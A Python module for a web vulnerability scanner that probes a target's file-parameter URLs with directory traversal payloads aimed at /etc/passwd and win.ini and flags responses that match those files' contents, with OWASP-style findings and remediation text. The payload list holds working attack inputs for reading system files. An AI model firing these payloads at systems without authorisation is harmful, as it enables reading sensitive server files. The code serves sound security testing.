import requests
from colorama import Fore

class DirectoryScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "../../../windows/win.ini",
            "..\\..\\..\\windows\\win.ini",
        ]
        self.signatures = [
            "root:x:0:0",
            "root:!:0:0",
            "[extensions]",
            "[fonts]",
            "daemon:x:",
            "bin:x:",
        ]
        self.test_paths = [
            "/vulnerabilities/fi/?page=",
            "/?file=",
            "/index.php?page=",
            "/download?file=",
        ]

    def scan(self):
        findings = []
        for path in self.test_paths:
            url = self.target + path
            for payload in self.payloads:
                try:
                    test_url = url + payload
                    response = requests.get(
                        test_url,
                        timeout=5,
                        allow_redirects=True,
                        verify=False
                    )
                    body = response.text.lower()
                    for sig in self.signatures:
                        if sig.lower() in body:
                            finding = {
                                "check": "Directory Traversal",
                                "severity": "Critical",
                                "owasp": "A01:2021 - Broken Access Control",
                                "url": test_url,
                                "payload": payload,
                                "description": f"Directory traversal vulnerability detected. Sensitive file content signature '{sig}' found in response. Attacker can read arbitrary files from the server.",
                                "remediation": "Validate and sanitise all file path inputs. Use a whitelist of allowed files. Never pass user input directly to file system functions. Implement proper access controls.",
                                "evidence": body[:300]
                            }
                            findings.append(finding)
                            print(Fore.RED + f"    [CRITICAL] Directory traversal found: {test_url}")
                            break
                except requests.exceptions.RequestException:
                    pass
        if not findings:
            print(Fore.GREEN + "    [PASS] No directory traversal vulnerabilities detected")
        return findings